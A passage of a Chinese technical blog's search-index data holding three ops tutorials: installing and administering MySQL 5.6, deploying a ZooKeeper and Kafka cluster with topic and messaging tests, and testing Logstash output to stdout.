E9%83%A8%E7%BD%B21/","excerpt":"数据库分类 123DBMS 指数据库管理系统，分为RDBMS(关系型数据库管理系统)和NoSQL(非关系型数据库)数据库世界排名统计网站：https:&#x2F;&#x2F;db-engines.com&#x2F;en&#x2F;ranking,根据排名趋势可以很清楚的知道研究方向","text":"数据库分类 123DBMS 指数据库管理系统，分为RDBMS(关系型数据库管理系统)和NoSQL(非关系型数据库)数据库世界排名统计网站：https:&#x2F;&#x2F;db-engines.com&#x2F;en&#x2F;ranking,根据排名趋势可以很清楚的知道研究方向 NoSQL产品代表: 12345键值存储：memcache、redis列存储：HBASE文档数据库: Mongodb(最接近关系型数据库)图形存储：Neo4j 通常以json格式进行数据存储 DBMS数据库产品代表 1Oracle 、Mysql 、MariaDB、PerconaDB MySQL启动过程 121. 启动后台守护进程，并生成工作线程2. 提供预分配内存结构供MySQL处理数据使用 什么是实例？ 1MySQL的后台进程+线程+预分配内存结构 MySQLD服务器程序构成 1234连接层 --&gt; SQL层 --&gt; 存储引擎层(磁盘&#x2F;内存&#x2F;网格)连接层：即客户端输入的SQL语句,如: select * from studentSQL层: 语法解析器解析SQL语句为 执行计划(即解析为SQL能理解的行为模式),授权并通过内部优化器自我判断(即自我判定选出一个成本最低的执行计划方式)，然后查询执行,执行后把结果交给存储引擎层（磁盘&#x2F;内存&#x2F;网络）进行数据调用，最后把结果返回给应用程序 MySQL启动流程 部署Mysql-V5.6 编译安装 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#安装依赖包yum groupinstall &quot;Development Tools&quot;yum install ncurses-devel libaio-devel -yrpm -qa ncurses-devel libaio-devel#安装预编译工具cmakeyum install -y cmake#创建用户useradd -s &#x2F;sbin&#x2F;nologin -M mysqlid mysql#官方下载mysql-版本:mysql-5.6.36[root@MBJ-11 ~]# md5sum mysql-5.6.36.tar.gz #检查md5是否与官方一致a36a241164c78286993cbe1079626cdd mysql-5.6.36.tar.gz#解压、进入目录编译tar -zxvf mysql-5.6.36.tar.gz &amp;&amp; cd mysql-5.6.36#注: cmake的作用：1.定制软件的安装路径2.定制mysql的源程序和命令脚本 bin&#x2F;mysqld (二进制的) 关键守护程序源码 bin&#x2F;mysql bin&#x2F;mysqld_safe scripts&#x2F;mysql.server bin&#x2F;mysqldump bin&#x2F;mysqladmin supports-file&#x2F;mysql_install_dbmysql编译命令cmake . -DCMAKE_INSTALL_PREFIX&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql-5.6.36 \\-DMYSQL_DATADIR&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql-5.6.36&#x2F;data \\-DMYSQL_UNIX_ADDR&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql-5.6.36&#x2F;data&#x2F;mysql.sock \\-DDEFAULT_CHARSET&#x3D;utf8 \\-DDEFAULT_COLLATION&#x3D;utf8_general_ci \\-DWITH_EXTRA_CHARSETS&#x3D;all \\-DWITH_INNOBASE_STORAGE_ENGINE&#x3D;1 \\-DWITH_FEDERATED_STORAGE_ENGINE&#x3D;1 \\-DWITH_BLACKHOLE_STORAGE_ENGINE&#x3D;1 \\-DWITHOUT_EXAMPLE_STORAGE_ENGINE&#x3D;1 \\-DWITH_ZLIB&#x3D;bundled \\-DWITH_SSL&#x3D;bundled \\-DENABLED_LOCAL_INFILE&#x3D;1 \\-DWITH_EMBEDDED_SERVER&#x3D;1 \\-DENABLE_DOWNLOADS&#x3D;1 \\-DWITH_DEBUG&#x3D;0 123如果上面编译出错，重新解压mysql源码包，进入目录重新cmake编译make &amp;&amp; make installln -s &#x2F;usr&#x2F;local&#x2F;mysql-5.6.36&#x2F; &#x2F;usr&#x2F;local&#x2F;mysql 初始化及创建数据库 1234567891011121314\\cp support-files&#x2F;my*.cnf &#x2F;etc&#x2F;my.cnf#初始化mysql&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;scripts&#x2F;mysql_install_db --basedir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F; --datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data --user&#x3D;mysqlchown -R mysql.mysql &#x2F;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;cp support-files&#x2F;mysql.server &#x2F;etc&#x2F;init.d&#x2F;mysqldchmod 700 &#x2F;etc&#x2F;init.d&#x2F;mysqldchkconfig mysqld onchkconfig --list mysqldmkdir -p &#x2F;usr&#x2F;local&#x2F;mysql-5.6.36&#x2F;data #创建mysql socket存放目录chown -R mysql:mysql &#x2F;usr&#x2F;local&#x2F;mysql-5.6.36&#x2F;data #修改目录权限&#x2F;etc&#x2F;init.d&#x2F;mysqld startnetstat -lntup |grep 3306 配置环境变量 123echo &#39;export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;bin&#39; &gt;&gt;&#x2F;etc&#x2F;profiletail -1 &#x2F;etc&#x2F;profilesource &#x2F;etc&#x2F;profile 排错 12查看错误日志tail -5 &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data&#x2F;$HOSTNAME.err Mysql基本优化 设置超级管理员密码 123mysqladmin -u root -p password &#39;123456&#39; #配置MySQL账户密码,默认为空mysql -uroot -p123456 #登陆测试mysql&gt; 清理用户及无用数据库 1234567891011121314151617181920212223242526272829mysql&gt; select user,password,host from mysql.user;+------+-------------------------------------------+--------------------+| user | password | host |+------+-------------------------------------------+--------------------+| root | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 | localhost || root | | host23.exmaple.com || root | | 127.0.0.1 || root | | ::1 || | | localhost || | | host23.exmaple.com |+------+-------------------------------------------+--------------------+#删除用户使用drop user命令mysql&gt; drop user &#39;&#39;@&#39;localhost&#39;;mysql&gt; drop user &#39;&#39;@&#39;host23.exmaple.com&#39;;mysql&gt; drop user &#39;root&#39;@&#39;::1&#39;;mysql&gt; drop user &#39;root&#39;@&#39;127.0.0.1&#39;;mysql&gt; drop user &#39;root&#39;@&#39;host23.exmaple.com&#39;;mysql&gt; select user,password,host from mysql.user;+------+-------------------------------------------+-----------+| user | password | host |+------+-------------------------------------------+-----------+| root | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 | localhost |+------+-------------------------------------------+-----------+ 123456789101112#删除数据库使用drop database命令mysql&gt; drop database test;mysql&gt; drop database performance_schema;mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql |+--------------------+ 常见问题 123常见问题:故障:ERROR! The server quit without updating PID file 解决方法：创建存放pid的目录并使用“chown -R mysql.mysql”命令,修改pid存放目录的权限 1kill&#x2F;pkill关停数据库或mysql服务器意外终止，造成启动失败 数据库管理 客户端连接到MySQL 12345通过socket方式：(mysql本地连接默认使用socket方式)mysql -uroot -p123456 -S &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data&#x2F;mysql.sock通过TCP&#x2F;IP方式mysql -uroot -p123456 -h 远程IP 用户管理 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#查询用户名、密码和权限mysql&gt; select user,password,host from mysql.user;+------+-------------------------------------------+-----------+| user | password | host |+------+-------------------------------------------+-----------+| root | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 | localhost |+------+-------------------------------------------+-----------+#查看数据库show databases;#创建数据库create database app;#查看指定数据库表use mysql;show tables;#创建用户并对指定数据库授权mysql&gt; grant all on app.* to app@&#39;10.0.0.%&#39; identified by &#39;123456&#39;;#创建单个用户create user &#39;用户&#39;@&#39;主机&#39; IDENTIFIED BY &#39;密码&#39;;create user &#39;oldboy&#39;@&#39;locahost&#39; identified by &#39;oldboy123&#39;; #给用户授权mysql&gt; grant all on mysql.* to zhangsan1@&#39;10.0.10.%&#39;;#删除用户drop user &#39;user&#39;@&#39;主机域&#39; 特殊的删除方法:mysql&gt; delete from mysql.user where user&#x3D;&#39;app&#39; and host&#x3D;&#39;localhost&#39;;mysql&gt; flush privileges;#创建用户同时授权grant all on *.* to oldgirl@&#39;172.16.1.%&#39; identified by &#39;oldgirl123&#39;;flush privileges;#查看某个用户数据库权限mysql&gt; select user,host,password from mysql.user;+----------+-----------+-------------------------------------------+| user | host | password |+----------+-----------+-------------------------------------------+| root | localhost | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 || zhangsan | 10.0.10.% | *23AE809DDACAF96AF0FD78ED04B6A265E05AA257 || lisi | 10.0.10.% | *23AE809DDACAF96AF0FD78ED04B6A265E05AA257 || super | localhost | *531E182E2F72080AB0740FE2F2D689DBE0146E04 || wanger | 10.0.10.% | *E8D868B7DA46FC9F996DC761C1AE01754A4447D5 |+----------+-----------+-------------------------------------------+mysql&gt; show grants for lisi@&#39;10.0.10.%&#39;\\G;*************************** 1. row ***************************Grants for lisi@10.0.10.%: GRANT USAGE ON *.* TO &#39;lisi&#39;@&#39;10.0.10.%&#39; IDENTIFIED BY PASSWORD &#39;*23AE809DDACAF96AF0FD78ED04B6A265E05AA257&#39;*************************** 2. row ***************************Grants for lisi@10.0.10.%: GRANT SELECT ON &#96;app&#96;.* TO &#39;lisi&#39;@&#39;10.0.10.%&#39;2 rows in set (0.00 sec)注：当单个用户权限出现冲突时，以权限最大的设置为准#单独收回数据库某个权限mysql&gt; revoke drop on wordpress.* from wordpress@&#39;10.0.0.%&#39;;Query OK, 0 rows affected (0.00 sec)#可以授权的用户权限:INSERT,SELECT, UPDATE, DELETE, CREATE, DROP, RELOAD, SHUTDOWN, PROCESS, FILE, REFERENCES, INDEX, ALTER, SHOW DATABASES, SUPER, CREATE TEMPORARY TABLES, LOCK TABLES, EXECUTE, REPLICATION SLAVE, REPLICATION CLIENT, CREATE VIEW, SHOW VIEW, CREATE ROUTINE, ALTER ROUTINE, CREATE USER, EVENT, TRIGGER, CREATE TABLESPACE#收回权限:REVOKE INSERT ON wordpress.* from oldboy@&#39;localhost&#39;;#收回某个数据库的所有权限revoke all on wordpress.* from wordpress@&#39;10.0.0.%&#39;;注：企业里创建用户一般是授权一个内网网段登录，最常见的网段写法有两种。方法1：172.16.1.%（%为通配符，匹配所有内容）。方法2：172.16.1.0&#x2F;255.255.255.0，但是不能使用172.16.1.0&#x2F;24，是个小遗憾。 123例：博客授权:grant select,insert,update,delete,create,drop on blog.* to &#39;blog&#39;@&#39;172.16.1.%&#39; identified by &#39;blog123&#39;;revoke create,drop on blog.* from &#39;blog&#39;@&#39;172.16.1.%&#39;; ####密码忘记后，修改密码方式 1234567891011121314适用于V5.6版本#用以下命令启动mysql&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;bin&#x2F;mysqld_safe --skip-grant-table --skip-networking &amp; #登陆mysqlmysql#修改密码：mysql&gt; select user,password,host from mysql.usermysql&gt; update mysql.user set password&#x3D;PASSWORD(&#39;123456&#39;) where user&#x3D;&#39;wordpress&#39; and host&#x3D;&#39;192.168.56.%&#39;;#正常启动mysqlmysql -uroot -p123456 -h 192.168.56.11 查看mysql错误代码含义-命令 1234567perror示例：[root@MBJ-11 data]# perror 110OS error code 110: Connection timed out[root@MBJ-11 data]# perror 111OS error code 111: Connection refused 配置文件读取顺序mysql配置文件读取顺序 12&#x2F;etc&#x2F;my.cnf --&gt; &#x2F;etc&#x2F;mysql&#x2F;my.cnf --&gt; $MYSQL_HOME&#x2F;my.cnf --&gt; ~&#x2F;.my.cnf --&gt; --defaults-extra-file --&gt; --defaults-file 最后读取命令行上其他的配置 单独定义一个文件来作为mysql socket 1234567891011&#x2F;etc&#x2F;init.d&#x2F;mysqld stop #停止服务vim &#x2F;tmp&#x2F;aaa.txt #创建并配置文件[mysqld]socket&#x3D;&#x2F;tmp&#x2F;aaa.sock&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;bin&#x2F;mysqld_safe --default-file&#x3D;&#x2F;tmp&#x2F;aaa.txt #启动如果想回归源socket文件，只需要正常启动mysqld服务即可。注：启动命令一旦使用了--default-file参数，其他mysql配置文件(即上面的配置文件读取顺序)均不会再读取","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"MariaDB","slug":"MariaDB","permalink":"https://garywu520.github.io/tags/MariaDB/"},{"name":"mysql","slug":"mysql","permalink":"https://garywu520.github.io/tags/mysql/"},{"name":"dba","slug":"dba","permalink":"https://garywu520.github.io/tags/dba/"},{"name":"PerconaDB","slug":"PerconaDB","permalink":"https://garywu520.github.io/tags/PerconaDB/"},{"name":"Oracle","slug":"Oracle","permalink":"https://garywu520.github.io/tags/Oracle/"}]},{"title":"分布式消息系统MQ之kafka部署","slug":"分布式消息系统MQ之kafka部署","date":"2017-12-22T04:03:53.000Z","updated":"2017-12-22T13:21:32.861Z","comments":true,"path":"2017/12/22/分布式消息系统MQ之kafka部署/","link":"","permalink":"https://garywu520.github.io/2017/12/22/%E5%88%86%E5%B8%83%E5%BC%8F%E6%B6%88%E6%81%AF%E7%B3%BB%E7%BB%9FMQ%E4%B9%8Bkafka%E9%83%A8%E7%BD%B2/","excerpt":"原理 kafka介绍 123Apache Kafka是分布式发布-订阅消息系统。它最初由LinkedIn公司开发，之后成为Apache项目的一部分。Kafka是一种快速、可扩展的、设计内在就是分布式的，分区的和可复制的提交日志服务。类似的消息系统还有RbbitMQ、ActiveMQ、ZeroMQ，最主要的优势是其具备分布式功能、并且结合zookeeper 可以实现动态扩容。","text":"原理 kafka介绍 123Apache Kafka是分布式发布-订阅消息系统。它最初由LinkedIn公司开发，之后成为Apache项目的一部分。Kafka是一种快速、可扩展的、设计内在就是分布式的，分区的和可复制的提交日志服务。类似的消息系统还有RbbitMQ、ActiveMQ、ZeroMQ，最主要的优势是其具备分布式功能、并且结合zookeeper 可以实现动态扩容。 Apache Kafka与传统消息系统相比，有以下不同 1234它被设计为一个分布式系统，易于向外扩展；它同时为发布和订阅提供高吞吐量；它支持多订阅者，当失败时能自动平衡消费者；它将消息持久化到磁盘，因此可用于批量消费，例如ETL，以及实时应用程序。 kafka基本组件 12345- 话题（Topic）: 是特定类型的消息流。 消息是字节的有效负载（Payload），话题是消息的分类名或种子（Feed）名。- 生产者（Producer）: 是能够发布消息到话题的任何对象。- 已发布的消息保存在一组服务器中，它们被称为代理（Broker）或Kafka集群。- 消费者可以订阅一个或多个话题，并从Broker拉数据，从而消费这些已发布的消息。 kafka整体架构 zookeeper 123456789提到kafka就必须说说zookeeper集群，zookeeper集群特性：zookeeper集群是否可用的依据是可用节点数量是否超过了集群的一半，zk集群中可用节点如果超过zookeeper集群节点总数量的一半，集群就认为是可用的(可用节点若等于集群的一半集群不可用)。假如有2台服务器做了zookeeper集群，只要任何一台故障或宕机，整个集群就不可用，因为可用的节点没有大于集群一半的数量；但是假如集群中有3个节点，那么当1个节点故障，还剩2个节点，大于3个节点的一半，所以一个节点故障集群是正常运行的。但是再坏1个节点就只剩一个节点集群就不可用了。假如有4台服务器做了zookeeper集群，最多只能损坏一个节点，若同时损坏两个，可用节点等于集群总节点的一半，此时集群是不可用的。所以这也就是为什么一个zookeeper集群的节点数建议是奇数的原因，建议5台机器做zookeeper机器，业务量小3台也行。 部署 部署zookeeper集群(3台zookeeper节点) 123456789101112官网: https:&#x2F;&#x2F;zookeeper.apache.org下载最新稳定版zookeeperwget https:&#x2F;&#x2F;archive.apache.org&#x2F;dist&#x2F;zookeeper&#x2F;stable&#x2F;zookeeper-3.4.10.tar.gz解压tar -xf zookeeper-3.4.10.tar.gz -C &#x2F;usr&#x2F;local&#x2F;cd &#x2F;usr&#x2F;local&#x2F;mv zookeeper-3.4.10 zookeeperuseradd zookeeper -s &#x2F;sbin&#x2F;nologin -Mchown -R zookeeper:zookeeper zookeepercd zookeepercp conf&#x2F;zoo_sample.cfg conf&#x2F;zoo.cfg 123456配置zookeeper环境变量tail -1 &#x2F;etc&#x2F;profileexport PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;binsource &#x2F;etc&#x2F;profileenv |grep zookeeper 配置zookeeper集群 123456789101112131415161718创建日志和数据存放目录并授权[root@localhost conf]# mkdir &#x2F;var&#x2F;log&#x2F;zookeeper -p[root@localhost conf]# chown -R zookeeper:zookeeper &#x2F;var&#x2F;log&#x2F;zookeeper[root@localhost zookeeper]# mkdir &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;data -p[root@localhost zookeeper]# chown -R zookeeper.zookeeper &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;datacd &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;conf&#x2F;编辑配置文件zoo.cfg[root@localhost conf]# egrep -v &quot;^#|^$&quot; zoo.cfg tickTime&#x3D;2000initLimit&#x3D;10syncLimit&#x3D;5dataDir&#x3D;&#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;dataclientPort&#x3D;2181dataLogDir&#x3D;&#x2F;var&#x2F;log&#x2F;zookeeperserver.1&#x3D; 10.0.10.21:2888:3888server.2&#x3D; 10.0.10.22:2888:3888server.3&#x3D; 10.0.10.23:2888:3888 创建ServerID标识 12345678910注：zookeeper集群模式下还要配置一个myid文件,这个文件需要放在data目录下。(1)在10.0.10.21服务器上创建myid文件,并设置值为1,同时需要与zoo.cfg文件里面的server.1对应 echo &quot;1&quot; &gt; &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;data&#x2F;myid (2)在10.0.10.22服务器上创建myid文件,并设置值为2,同时需要与zoo.cfg文件里面的server.2对应 echo &quot;2&quot; &gt; &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;data&#x2F;myid (3)在10.0.10.23服务器上创建myid文件,并设置值为3,同时需要与zoo.cfg文件里面的server.3对应 echo &quot;3&quot; &gt; &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;data&#x2F;myid 启动并验证zookeeper集群 12345分别启动三台zookeeper服务器服务zkServer.sh start在任意一台查看zookeeper集群服务状态(注：需要所有成员服务器均启动服务后才能查看，否则会报错)zkServer.sh status 12345678910111213141516171819IP地址: 10.0.10.21&#x2F;24[root@localhost ~]# zkServer.sh statusZooKeeper JMX enabled by defaultUsing config: &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;bin&#x2F;..&#x2F;conf&#x2F;zoo.cfgMode: followerIP地址: 10.0.10.22&#x2F;24[root@localhost ~]# zkServer.sh statusZooKeeper JMX enabled by defaultUsing config: &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;bin&#x2F;..&#x2F;conf&#x2F;zoo.cfgMode: leaderIP地址: 10.0.10.23&#x2F;24[root@localhost ~]# zkServer.sh statusZooKeeper JMX enabled by defaultUsing config: &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;bin&#x2F;..&#x2F;conf&#x2F;zoo.cfgMode: follower出现以上信息说明：zookeeper集群已经成功部署。 测试连接zookeeper集群 1234567891011121314151617对于客户端来说，zookeeper集群是一个整体，连接到zookeeper集群实际上感觉在独享整个集群的服务，所以，你可以在任何一个结点上建立到服务集群的连接。例如：在其中10.0.10.57节点使用zkCli.sh命令连接zookeeper服务器10.0.10.21:2181,如下[root@localhost ~]# zkCli.sh -server 10.0.10.21:2181Connecting to 10.0.10.21:21812017-11-28 02:12:42,232 [myid:] - INFO [main:Environment@100] - Client environment:zookeeper.version&#x3D;3.4.10-39d3a4f269333c922ed3db283be479f9deacaa0f, built on 03&#x2F;23&#x2F;2017 10:13 GMT2017-11-28 02:12:42,238 [myid:] - INFO [main:Environment@100] - Client environment:host.name&#x3D;localhostWatchedEvent state:SyncConnected type:None path:null[zk: 10.0.10.21:2181(CONNECTED) 0] [zk: 10.0.10.21:2181(CONNECTED) 0] ls &#x2F; [zookeeper][zk: 10.0.10.21:2181(CONNECTED) 1] [zk: 10.0.10.21:2181(CONNECTED) 1]到此有关zookeeper集群搭建就完全结束注意: 生产环境需要考虑zookeeper自启配置,可参考：https:&#x2F;&#x2F;wuyanteng.github.io&#x2F;2017&#x2F;11&#x2F;28&#x2F;zookeeper%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2&#x2F; 部署kafka集群(3台zookeeper机器分别安装kafka) 1234下载： https:&#x2F;&#x2F;kafka.apache.orgtar -xf kafka_2.11-1.0.0.tgz -C &#x2F;usr&#x2F;localln -s kafka_2.11-1.0.0 kafka 配置kafka环境变量 123456配置kafka环境变量tail -1 &#x2F;etc&#x2F;profileexport PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;kafka&#x2F;binsource &#x2F;etc&#x2F;profileenv |grep kafka 节点1-kafka配置 12345[root@host21 local]# grep &quot;^[a-Z]&quot; &#x2F;usr&#x2F;local&#x2F;kafka&#x2F;config&#x2F;server.propertiesbroker.id&#x3D;1listeners&#x3D;PLAINTEXT:&#x2F;&#x2F;10.0.10.21:9092log.retention.hours&#x3D;24 #保留指定小时的日志内容zookeeper.connect&#x3D;10.0.10.21:2181,10.0.10.22:2181,10.0.10.23:2181 #指定所有的kafka节点 节点2-kafka配置 12345[root@host21 local]# grep &quot;^[a-Z]&quot; &#x2F;usr&#x2F;local&#x2F;kafka&#x2F;config&#x2F;server.propertiesbroker.id&#x3D;2listeners&#x3D;PLAINTEXT:&#x2F;&#x2F;10.0.10.22:9092log.retention.hours&#x3D;24zookeeper.connect&#x3D;10.0.10.21:2181,10.0.10.22:2181,10.0.10.23:2181 节点3-kafka配置 12345[root@host21 local]# grep &quot;^[a-Z]&quot; &#x2F;usr&#x2F;local&#x2F;kafka&#x2F;config&#x2F;server.propertiesbroker.id&#x3D;3listeners&#x3D;PLAINTEXT:&#x2F;&#x2F;10.0.10.23:9092log.retention.hours&#x3D;24zookeeper.connect&#x3D;10.0.10.21:2181,10.0.10.22:2181,10.0.10.23:2181 在3个节点分别启动kafka 12345#以守护进程的方式启动&#x2F;usr&#x2F;local&#x2F;kafka&#x2F;bin&#x2F;kafka-server-start.sh -daemon &#x2F;usr&#x2F;local&#x2F;kafka&#x2F;config&#x2F;server.properties#查看日志tailf &#x2F;usr&#x2F;local&#x2F;kafka&#x2F;logs&#x2F;server.log 分别验证kafka进程 1234[root@host21 ~]# jps784 Jps30598 QuorumPeerMain710 Kafka 测试Topic 创建名为logstashtest，partitions(分区)为3，replication(复制)为3的topic(主题) 1234在任意kafka服务器上操作：[root@host21 ~]# kafka-topics.sh --create --zookeeper 10.0.10.21:2181,10.0.10.22:2181,10.0.10.23:2181 --partitions 3 --replication-factor 3 --topic logstashtestCreated topic &quot;logstashtest&quot;. 测试获取topic 123456可以在任意kafka服务器上测试：[root@host23 local]# kafka-topics.sh --describe --zookeeper 10.0.10.21:2181,10.0.10.22:2181,10.0.10.23:2181 --topic logstashtestTopic:logstashtest PartitionCount:3 ReplicationFactor:3 Configs: Topic: logstashtest Partition: 0 Leader: 0 Replicas: 0,1,2 Isr: 0,1,2 Topic: logstashtest Partition: 1 Leader: 1 Replicas: 1,2,0 Isr: 1,2,0 Topic: logstashtest Partition: 2 Leader: 2 Replicas: 2,0,1 Isr: 2,0,1 12状态说明：logstashtest这个topic，当前有三个分区分别为0、1、2 分区0 有三个副本，并且状态都为lsr（ln-sync，表示可以参加选举成为leader）。 删除一个topic 123456789101112创建一个名称为test的topic,来测试删除[root@host21 ~]# kafka-topics.sh --create --zookeeper 10.0.10.21:2181,10.0.10.22:2181,10.0.10.23:2181 --partitions 3 --replication-factor 3 --topic testCreated topic &quot;test&quot;.删除名为test的topic[root@host21 ~]# kafka-topics.sh --delete --zookeeper 10.0.10.21:2181,10.0.10.22:2181,10.0.10.23:2181 --topic testTopic test is marked for deletion.Note: This will have no impact if delete.topic.enable is not set to true.验证是否删除[root@host21 ~]# kafka-topics.sh --describe --zookeeper 10.0.10.21:2181,10.0.10.22:2181,10.0.10.23:2181 --topic test[root@host21 ~]# 获取所有topic 123[root@host21 ~]# kafka-topics.sh --list --zookeeper 10.0.10.21:2181,10.0.10.22:2181,10.0.10.23:2181 _consumer_offsetslogstashtest[root@host21 ~]# kafka命令测试消息发送 123[root@host21 ~]# kafka-topics.sh --create --zookeeper 10.0.10.21:2181,10.0.10.22:2181,10.0.10.23:2181 --partitions 3 --replication-factor 3 --topic messagetestCreated topic &quot;messagetest&quot;.[root@host21 ~]# 发送消息 12345kafka-console-producer.sh --broker-list 10.0.10.21:9092,10.0.10.22:9092,10.0.10.23:9092 --topic logstashtest&gt;123&gt;456&gt;Hello Kafka&gt; 其他kafka服务器服务器测试获取消息 服务器A获取消息 12345[root@host21 ~]# kafka-console-consumer.sh --zookeeper 10.0.10.21:2181,10.0.10.22:2181,10.0.10.23:2181 --topic logstashtest --from-beginningUsing the ConsoleConsumer with old consumer is deprecated and will be removed in a future major release. Consider using the new consumer by passing [bootstrap-server] instead of [zookeeper].456Hello Kafka123 服务器B获取消息 12345[root@host22 local]# kafka-console-consumer.sh --zookeeper 10.0.10.21:2181,10.0.10.22:2181,10.0.10.23:2181 --topic logstashtest --from-beginningUsing the ConsoleConsumer with old consumer is deprecated and will be removed in a future major release. Consider using the new consumer by passing [bootstrap-server] instead of [zookeeper].456Hello Kafka123 服务器C获取消息 12345[root@host23 local]# kafka-console-consumer.sh --zookeeper 10.0.10.21:2181,10.0.10.22:2181,10.0.10.23:2181 --topic logstashtest --from-beginningUsing the ConsoleConsumer with old consumer is deprecated and will be removed in a future major release. Consider using the new consumer by passing [bootstrap-server] instead of [zookeeper].Hello Kafka456123 使用logstash测试向kafka写入数据 123456789101112131415161718在安装有logstash的机器上操作：vim &#x2F;etc&#x2F;logstash&#x2F;conf.d&#x2F;logstash-to-kafka.shinput &#123; stdin &#123;&#125;&#125;output &#123; kafka &#123; topic_id &#x3D;&gt; &quot;hello&quot; bootstrap_servers &#x3D;&gt; &quot;10.0.10.21:9092&quot; batch_size &#x3D;&gt; 5 &#125; stdout &#123; codec &#x3D;&gt; rubydebug &#125;&#125; 12345验证logstash语法[root@localhost conf.d]# logstash -f &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;config&#x2F;conf.d&#x2F;logstash-to-kafka.sh -tSending Logstash&#39;s logs to &#x2F;var&#x2F;log&#x2F;logstash which is now configured via log4j2.propertiesConfiguration OK 测试logstash向kafka写入数据 1234567891011121314151617181920logstash服务器前台启动[root@localhost conf.d]# logstash -f &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;config&#x2F;conf.d&#x2F;logstash-to-kafka.sh手动输入测试内容：hello&#123; &quot;@version&quot; &#x3D;&gt; &quot;1&quot;, &quot;host&quot; &#x3D;&gt; &quot;localhost.localdomain&quot;, &quot;@timestamp&quot; &#x3D;&gt; 2017-12-22T13:17:56.632Z, &quot;message&quot; &#x3D;&gt; &quot;hello&quot;&#125;logstash&#123; &quot;@version&quot; &#x3D;&gt; &quot;1&quot;, &quot;host&quot; &#x3D;&gt; &quot;localhost.localdomain&quot;, &quot;@timestamp&quot; &#x3D;&gt; 2017-12-22T13:18:21.852Z, &quot;message&quot; &#x3D;&gt; &quot;logstash&quot;&#125; 123456789在21的kafka机器上运行如下消费命令：kafka-console-consumer.sh --zookeeper 10.0.10.21:2181,10.0.10.22:2181,10.0.10.23,2181 --topic hello --from-beginning结果如下：Using the ConsoleConsumer with old consumer is deprecated and will be removed in a future major release. Consider using the new consumer by passing [bootstrap-server] instead of [zookeeper].2017-12-22T13:17:56.632Z localhost.localdomain hello2017-12-22T13:18:21.852Z localhost.localdomain logstash – End –","categories":[],"tags":[{"name":"kafka","slug":"kafka","permalink":"https://garywu520.github.io/tags/kafka/"},{"name":"zookeeper","slug":"zookeeper","permalink":"https://garywu520.github.io/tags/zookeeper/"},{"name":"producer","slug":"producer","permalink":"https://garywu520.github.io/tags/producer/"},{"name":"consumer","slug":"consumer","permalink":"https://garywu520.github.io/tags/consumer/"},{"name":"MQ","slug":"MQ","permalink":"https://garywu520.github.io/tags/MQ/"},{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"logstash","slug":"logstash","permalink":"https://garywu520.github.io/tags/logstash/"},{"name":"topic","slug":"topic","permalink":"https://garywu520.github.io/tags/topic/"},{"name":"RbbitMQ","slug":"RbbitMQ","permalink":"https://garywu520.github.io/tags/RbbitMQ/"}]},{"title":"logstash测试输出","slug":"logstash测试输出","date":"2017-12-19T13:27:44.000Z","updated":"2017-12-19T14:01:35.676Z","comments":true,"path":"2017/12/19/logstash测试输出/","link":"","permalink":"https://garywu520.github.io/2017/12/19/logstash%E6%B5%8B%E8%AF%95%E8%BE%93%E5%87%BA/","excerpt":"1在配置ELK logstash的时候，为了降低错误，在收集的log输出到kafka或redis或elasticsearch之前，需要测试log是否正常","text":"1在配置ELK logstash的时候，为了降低错误，在收集的log输出到kafka或redis或elasticsearch之前，需要测试log是否正常 以nginx 测试输出为例 1vim &#x2F;etc&#x2F;logstash&#x2F;conf.d&#x2F;nginx.conf 123456789101112131415input &#123; file &#123; path &#x3D;&gt; &quot;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&quot; start_position &#x3D;&gt; &quot;end&quot; type &#x3D;&gt; &quot;nginx-accesslog&quot; codec &#x3D;&gt; json &#125;&#125;output &#123; stdout &#123; codec &#x3D;&gt; rubydebug #输出模式: rubydebug &#125;&#125; 检测logstash配置文件语法并重启服务 1logstash -f &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;config&#x2F;conf.d&#x2F;nginx.conf -t 前台启动logstash 12345678#前台测试输出务必stop logstash服务systemctl stop logstash #前台启动logstashlogstash -f &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;config&#x2F;conf.d&#x2F;nginx.conf刷新nginx测试页面,等待屏幕输出，如果输出的是json格式说明OK 1OK, 